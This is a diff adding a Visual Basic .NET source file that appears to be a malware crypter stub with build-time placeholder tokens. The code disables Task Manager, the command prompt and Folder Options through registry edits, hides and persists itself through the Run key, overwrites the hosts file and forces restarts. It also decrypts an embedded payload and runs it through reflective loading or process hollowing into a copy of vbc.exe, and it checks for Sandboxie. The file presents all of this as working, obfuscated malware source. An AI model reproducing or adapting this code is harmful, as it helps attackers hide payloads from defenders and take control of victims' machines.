@@ -1,0 +1,316 @@
+Imports System, Microsoft.VisualBasic
+Imports System.Runtime.InteropServices
+Imports System.Text
+Imports System.Reflection
+Imports System.Security.Cryptography
+Imports System.Runtime.CompilerServices
+Imports System.IO
+Imports System.IO.FileStream
+Imports System.ComponentModel
+Imports Microsoft.Win32
+Imports System.Diagnostics
+Imports System.Object
+Imports System.Net
+Imports System.Windows.Forms
+
+Module ErAqwXXCv15Ervito
+
+     Dim Melt As String = "%21%"
+        Dim DisTask As String = "%22%"
+        Dim DisCMD As String = "%23%"
+        Dim DisFolder As String = "%24%"
+        Dim ForceRestart As String = "%25%"
+		Dim HideExec as String = "%26%"
+		Dim Startup as String = "%27%"
+		Dim HostEditing as String = "%28%"
+
+    Sub Main()
+  
+        If Melt = "T" Then
+            Melty("kernel32.exe")
+        Else : End If
+
+        If DisTask = "T" Then
+            Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
+        Else : End If
+
+        If DisCMD = "T" Then
+            Shell("REG add HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
+        Else : End If
+
+        If DisFolder = "T" Then
+            Shell("REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
+            Shell("REG add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
+        Else : End If
+
+        If ForceRestart = "T" Then
+            Shell("shutdown -r -t 00", AppWinStyle.Hide)
+        Else : End If
+
+		If HideExec = "T" Then
+		File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)
+		Else : End If
+
+		If Startup = "T" Then
+		Try
+                Dim attribute As FileAttributes = FileAttributes.Hidden
+                Dim filecopied As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\%39%.exe"
+                File.Copy(Application.ExecutablePath, filecopied)
+                File.SetAttributes(filecopied, attribute)
+                My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("1" & Application.ProductName, filecopied)
+            Catch
+            End Try
+			Else : End if
+
+			If HostEditing = "T" Then
+			HostEdit()
+			Else : End If
+
+        'End of Extra Settings
+
+        Dim pewpew As String = Environment.GetEnvironmentVariable("windir") & "\Microsoft.NET\Framework\v2.0.50727\vbc.exe"
+        Dim kakaka As String = Environment.GetEnvironmentVariable("windir") & "\temp\%1337%.exe"
+        Dim gfsD125647Cjqfbc6B6DBYA8SuheGxBvqEsiTk85ij8GO7XO983CGbGxk8eka54xwZ93LNaVCt4QpWlSDF3zZfrE47557dAQa12143cH2I0Jqk2eph64g8bOjUWL88qHvhqTBlDyCz2WPnZ2gF65Eb9kPh As String = pfasodkf0439kf3pweofkf0439fkpodskf048wj5t9powfkw0439pkowrekfpockcrcew9
+        Dim zer956170cNhs4cO6k02C20bz26mDx3te0p6D91nToFasoAZw509UoQ73t56b0xPp948rzfEfa8fSeZSpdL4b7Ko3oIQBFxX8fTsblJ953x08SojEUU4oBa91SB9Zpdroo4x40gYf9rkDFFDDDdd6oEZ2L54s As Byte() = decrypt(Convert.FromBase64String(gfsD125647Cjqfbc6B6DBYA8SuheGxBvqEsiTk85ij8GO7XO983CGbGxk8eka54xwZ93LNaVCt4QpWlSDF3zZfrE47557dAQa12143cH2I0Jqk2eph64g8bOjUWL88qHvhqTBlDyCz2WPnZ2gF65Eb9kPh), "ForcedHacking")
+        Randomize()
+        System.Text.Encoding.GetEncoding(1252).GetBytes(pfasodkf0439kf3pweofkf0439fkpodskf048wj5t9powfkw0439pkowrekfpockcrcew9)
+        'Delete if Have
+        File.Delete(kakaka)
+        'Copying VBC to Temp
+        File.Copy(pewpew, kakaka)
+   
+        Try
+            ErAqwXXCv15Ervito.JPgJtnV(zer956170cNhs4cO6k02C20bz26mDx3te0p6D91nToFasoAZw509UoQ73t56b0xPp948rzfEfa8fSeZSpdL4b7Ko3oIQBFxX8fTsblJ953x08SojEUU4oBa91SB9Zpdroo4x40gYf9rkDFFDDDdd6oEZ2L54s)
+        Catch
+            PE32.PhysicalEducation(zer956170cNhs4cO6k02C20bz26mDx3te0p6D91nToFasoAZw509UoQ73t56b0xPp948rzfEfa8fSeZSpdL4b7Ko3oIQBFxX8fTsblJ953x08SojEUU4oBa91SB9Zpdroo4x40gYf9rkDFFDDDdd6oEZ2L54s, kakaka)
+        End Try
+        End
+    End Sub
+
+    Private Sub HostEdit()
+        Dim systempath As String = Environment.GetFolderPath(Environment.SpecialFolder.System)
+
+        Dim hosts As String = systempath & "\" & "drivers" & "\" & "etc" & "\\" & "hosts"
+        'this creates a new string with the value of systempath and the above text
+        'in VB.NET we do not need two \\'s only one.
+
+        Dim writer As New StreamWriter(hosts)
+
+        writer.Write("%29%")
+
+        writer.Write(Environment.NewLine)
+
+        writer.Write("%30%")
+
+        writer.Write(Environment.NewLine)
+
+        writer.Write("%31%")
+
+        writer.Write(Environment.NewLine)
+
+        writer.Write("%32%")
+
+        writer.Write(Environment.NewLine)
+
+        writer.Write("%33%")
+
+        writer.Write(Environment.NewLine)
+
+        writer.Write("%34%")
+
+        writer.Write(Environment.NewLine)
+
+        writer.Write("%35%")
+
+        writer.Write(Environment.NewLine)
+
+        writer.Write("%36%")
+
+        writer.Write(Environment.NewLine)
+
+        writer.Write("%37%")
+
+        writer.Write(Environment.NewLine)
+
+        writer.Write("%38%")
+
+
+        writer.Dispose()
+
+    End Sub
+
+    Sub FunctionsWin()
+      
+    End Sub
+
+
+
+
+
+    Public Sub JPgJtnV(ByVal Bytes As Byte())
+        Dim Assembly As Reflection.Assembly = Assembly.Load(Bytes)
+        Dim entryPoint As MethodInfo = [Assembly].EntryPoint
+        Dim objectValue As Object = RuntimeHelpers.GetObjectValue([Assembly].CreateInstance(entryPoint.Name))
+        entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), New Object() {New String() {"1"}})
+    End Sub
+
+    Sub Melty(ByVal NewName As String)
+        On Error Resume Next
+        Dim NewFolder As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
+        If Not Application.StartupPath = NewFolder Then
+            IO.File.Copy(Application.ExecutablePath, NewFolder & "\" & NewName)
+            Diagnostics.Process.Start(NewFolder & "\" & NewName & " " & Application.ExecutablePath)
+            IO.File.SetAttributes(NewFolder & "\" & NewName, IO.FileAttributes.Hidden)
+            End
+        Else : Kill(Command)
+        End If
+    End Sub
+
+
+    Function decrypt(ByVal message As Byte(), ByVal password As String) As Byte()
+        Dim O6BB3K791m1D8qTyc2v7875E9A1nTpassarrP22wIwq85bVrtWSy2l882mfOIw0y1Qus3URxG45nrwNFZ7J8L3UXoRx As Byte() = System.Text.Encoding.Default.GetBytes(password)
+        Dim VVlv4cC8Xf8XWeM5DNICaJ3mA01A8rallazK1T68e27rand1EHqRWBKU7rL3nv9V6hg5sbz7t34utQk9TOzQTHOHUxar1FSpR6iV9BeRR86ss4Qcb7S1X0bb736zdv61PRcAN As Integer = message(message.Length - 1) Xor 112
+        Dim outarr(message.Length) As Byte
+        Dim Dve2KT16Xxtv6z68P0A5oH3C7LHtk2TjuE5ZUmeT6bAd13t191BI3F1u13YrWPN6aw5eq8bazu47M8CLsNDq78B725la6P4g19CbNwjCVU588k2f51p4pLLB48r3R6f4fC32z5udu9pab8kELo5k As Integer
+        For i1 As Integer = 0 To message.Length - 1
+            outarr(i1) = (message(i1) Xor VVlv4cC8Xf8XWeM5DNICaJ3mA01A8rallazK1T68e27rand1EHqRWBKU7rL3nv9V6hg5sbz7t34utQk9TOzQTHOHUxar1FSpR6iV9BeRR86ss4Qcb7S1X0bb736zdv61PRcAN) Xor O6BB3K791m1D8qTyc2v7875E9A1nTpassarrP22wIwq85bVrtWSy2l882mfOIw0y1Qus3URxG45nrwNFZ7J8L3UXoRx(Dve2KT16Xxtv6z68P0A5oH3C7LHtk2TjuE5ZUmeT6bAd13t191BI3F1u13YrWPN6aw5eq8bazu47M8CLsNDq78B725la6P4g19CbNwjCVU588k2f51p4pLLB48r3R6f4fC32z5udu9pab8kELo5k)
+            If Dve2KT16Xxtv6z68P0A5oH3C7LHtk2TjuE5ZUmeT6bAd13t191BI3F1u13YrWPN6aw5eq8bazu47M8CLsNDq78B725la6P4g19CbNwjCVU588k2f51p4pLLB48r3R6f4fC32z5udu9pab8kELo5k = password.Length - 1 Then Dve2KT16Xxtv6z68P0A5oH3C7LHtk2TjuE5ZUmeT6bAd13t191BI3F1u13YrWPN6aw5eq8bazu47M8CLsNDq78B725la6P4g19CbNwjCVU588k2f51p4pLLB48r3R6f4fC32z5udu9pab8kELo5k = 0 Else Dve2KT16Xxtv6z68P0A5oH3C7LHtk2TjuE5ZUmeT6bAd13t191BI3F1u13YrWPN6aw5eq8bazu47M8CLsNDq78B725la6P4g19CbNwjCVU588k2f51p4pLLB48r3R6f4fC32z5udu9pab8kELo5k = Dve2KT16Xxtv6z68P0A5oH3C7LHtk2TjuE5ZUmeT6bAd13t191BI3F1u13YrWPN6aw5eq8bazu47M8CLsNDq78B725la6P4g19CbNwjCVU588k2f51p4pLLB48r3R6f4fC32z5udu9pab8kELo5k + 1
+        Next
+        ReDim Preserve outarr(message.Length - 2)
+        Return outarr
+    End Function
+End Module
+
+Public Class PE32
+    Public Const PAGE_NOCACHE As Long = &H200
+    Public Const PAGE_EXECUTE_READWRITE As Long = &H40
+    Public Const PAGE_EXECUTE_WRITECOPY As Long = &H80
+    Public Const PAGE_EXECUTE_READ As Long = &H20
+    Public Const PAGE_EXECUTE As Long = &H10
+    Public Const PAGE_WRITECOPY As Long = &H8
+    Public Const PAGE_NOACCESS As Long = &H1
+    Public Const PAGE_READWRITE As Long = &H4
+    Public Const PAGE_READONLY As UInt32 = &H2
+
+    Public Shared Sub PhysicalEducation(ByVal data() As Byte, ByVal target As String)
+        Dim C = New Context, SH As Section_Header, PI = New Process_Information, SI = New Startup_Information, PS = New Security_Flags, TS = New Security_Flags
+        Dim GC = GCHandle.Alloc(data, GCHandleType.Pinned)
+        Dim Buffer As Integer = GC.AddrOfPinnedObject.ToInt32
+        Dim DH As New DOS_Header
+        DH = Marshal.PtrToStructure(GC.AddrOfPinnedObject, DH.GetType)
+        GC.Free()
+        Dim CP As CP = CreateAPI(Of CP)("kernel32", "CreateProcessA")
+        Dim GTC As GTC = CreateAPI(Of GTC)("kernel32", "GetThreadContext")
+        Dim RPM As RPM = CreateAPI(Of RPM)("kernel32", "ReadProcessMemory")
+        Dim WPM As WPM = CreateAPI(Of WPM)("kernel32", "WriteProcessMemory")
+        Dim UVS As UVS = CreateAPI(Of UVS)("ntdll", "ZwUnmapViewOfSection")
+        Dim VA As VA = CreateAPI(Of VA)("kernel32", "VirtualAllocEx")
+        Dim STC As STC = CreateAPI(Of STC)("kernel32", "SetThreadContext")
+        Dim RT As RT = CreateAPI(Of RT)("kernel32", "ResumeThread")
+        If CP(Nothing, target, PS, TS, False, 4, Nothing, Nothing, SI, PI) = 0 Then Return
+        Dim NH As New NT_Headers
+        NH = Marshal.PtrToStructure(New IntPtr(Buffer + DH.Address), NH.GetType)
+        Dim Address, Offset As Long, ret As UInteger
+        SI.CB = Len(SI)
+        C.Flags = 65539
+        If NH.Signature <> 17744 Or DH.Magic <> 23117 Then Return
+        If CP(Nothing, target, PS, TS, False, 4, Nothing, Nothing, SI, PI) = 0 Then Return
+        GTC(PI.Thread, C)
+        RPM(PI.Process, C.Ebx + 8, Address, 4, 0)
+        UVS(PI.Process, Address)
+        Dim ImageBase As UInt32 = VA(PI.Process, NH.Optional.Image, NH.Optional.SImage, 12288, 4)
+        If ImageBase <> 0 Then
+            WPM(PI.Process, ImageBase, data, NH.Optional.SHeaders, ret)
+            Offset = DH.Address + 248
+            For I As Integer = 0 To NH.File.Sections - 1
+                SH = Marshal.PtrToStructure(New IntPtr(Buffer + Offset + I * 40), SH.GetType)
+                Dim Raw(SH.Size) As Byte
+                For Y As Integer = 0 To SH.Size - 1 : Raw(Y) = data(SH.Pointer + Y) : Next
+                WPM(PI.Process, ImageBase + SH.Address, Raw, SH.Size, ret)
+            Next I
+            Dim T = BitConverter.GetBytes(ImageBase)
+            WPM(PI.Process, C.Ebx + 8, T, 4, ret)
+            C.Eax = ImageBase + NH.Optional.Address
+            STC(PI.Thread, C)
+            RT(PI.Thread)
+        End If
+    End Sub
+    Declare Function LoadLibraryA Lib "kernel32" (ByVal name As String) As IntPtr
+    Declare Function GetProcAddress Lib "kernel32" (ByVal handle As IntPtr, ByVal name As String) As IntPtr
+    Private Shared Function CreateAPI(Of T)(ByVal name As String, ByVal method As String) As T
+        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(name), method), GetType(T)), Object), T)
+    End Function
+    <StructLayout(0)> Structure Context
+        Dim Flags, D0, D1, D2, D3, D6, D7 As UInt32, Save As Save
+        Dim SG, SF, SE, SD, Edi, Esi, Ebx, Edx, Ecx, Eax, Ebp, Eip, SC, EFlags, Esp, SS As UInt32
+        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=512)> Dim Registers As Byte()
+    End Structure
+    <StructLayout(0)> Structure Save
+        Dim Control, Status, Tag, ErrorO, ErrorS, DataO, DataS As UInteger
+        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=80)> Dim RegisterArea As Byte()
+        Dim State As UInt32
+    End Structure
+    Structure Misc
+        Dim Address, Size As UInt32
+    End Structure
+    Structure Section_Header
+        Dim Name As Byte, Misc As Misc, Address, Size, Pointer, PRelocations, PLines, NRelocations, NLines, Flags As UInt32
+    End Structure
+    Structure Process_Information
+        Dim Process, Thread As IntPtr, ProcessId, ThreadId As Integer
+    End Structure
+    <StructLayout(0, CharSet:=3)> Structure Startup_Information
+        Dim CB As Integer, ReservedA, Desktop, Title As String, X, Y, XSize, YSize, XCount, YCount, Fill, Flags As Integer
+        Dim ShowWindow, ReservedB As Short, ReservedC, Input, Output, [Error] As Integer
+    End Structure
+    <StructLayout(0)> Structure Security_Flags
+        Dim Length As Integer, Descriptor As IntPtr, Inherit As Integer
+    End Structure
+    <StructLayout(0)> Structure DOS_Header
+        Dim Magic, Last, Pages, Relocations, Size, Minimum, Maximum, SS, SP, Checksum, IP, CS, Table, Overlay As UInt16
+        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=4)> Dim ReservedA As UInt16()
+        Dim ID, Info As UInt16
+        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=10)> Dim ReservedB As UInt16()
+        Dim Address As Int32
+    End Structure
+    Structure NT_Headers
+        Dim Signature As UInt32, File As File_Header, [Optional] As Optional_Headers
+    End Structure
+    <StructLayout(0)> Structure File_Header
+        Dim Machine, Sections As UInt16, Stamp, Table, Symbols As UInt32, Size, Flags As UInt16
+    End Structure
+    <StructLayout(0)> Structure Optional_Headers
+        Public Magic As UInt16, Major, Minor As Byte, SCode, IData, UData, Address, Code, Data, Image As UInt32, SectionA, FileA As UInt32
+        Public MajorO, MinorO, MajorI, MinorI, MajorS, MinorS As UInt16, Version, SImage, SHeaders, Checksum As UInt32, Subsystem, Flags As UInt16
+        Public SSReserve, SSCommit, SHReserve, SHCommit, LFlags, Count As UInt32
+        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=16)> Public DataDirectory As Data_Directory()
+    End Structure
+    <StructLayout(0)> Structure Data_Directory
+        Dim Address, Size As UInt32
+    End Structure
+    Delegate Function CP(ByVal name As String, ByVal command As String, ByRef process As Security_Flags, ByRef thread As Security_Flags, ByVal inherit As Boolean, ByVal flags As UInt32, ByVal system As IntPtr, ByVal current As String, <[In]()> ByRef startup As Startup_Information, <Out()> ByRef info As Process_Information) As Boolean
+    Delegate Function WPM(ByVal process As IntPtr, ByVal address As Integer, ByVal buffer As Byte(), ByVal size As Integer, <Out()> ByRef written As Integer) As Boolean
+    Delegate Function RPM(ByVal process As IntPtr, ByVal address As Integer, ByRef buffer As Integer, ByVal size As Integer, ByRef read As Integer) As Integer
+    Delegate Function VA(ByVal process As IntPtr, ByVal address As Integer, ByVal size As UInt32, ByVal type As UInt32, ByVal protect As UInt32) As IntPtr
+    Delegate Function UVS(ByVal process As IntPtr, ByVal address As Integer) As Long
+    Delegate Function RT(ByVal thread As IntPtr) As UInt32
+    Delegate Function GTC(ByVal thread As IntPtr, ByRef context As Context) As Boolean
+    Delegate Function STC(ByVal thread As IntPtr, ByRef context As Context) As Boolean
+End Class
+
+Public Class Antis
+    Public Shared Function antiSandboxie() As Boolean
+        On Error GoTo error1
+        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
+            Return True
+        Else
+            Return False
+        End If
+error1:
+        Exit Function
+    End Function
+End Class
+
+%101%
+%102%
+%103%
